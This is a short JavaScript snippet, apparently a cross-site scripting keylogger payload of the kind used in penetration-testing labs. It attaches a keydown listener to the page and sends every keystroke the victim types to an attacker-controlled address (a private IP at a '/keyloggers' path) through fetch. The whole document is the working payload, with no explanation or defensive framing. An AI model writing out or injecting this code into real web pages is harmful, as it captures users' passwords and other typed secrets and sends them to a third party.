function logKey(event){
        fetch("http://192.168.45.195/keyloggers?k=" + event.key)
}

document.addEventListener('keydown', logKey);
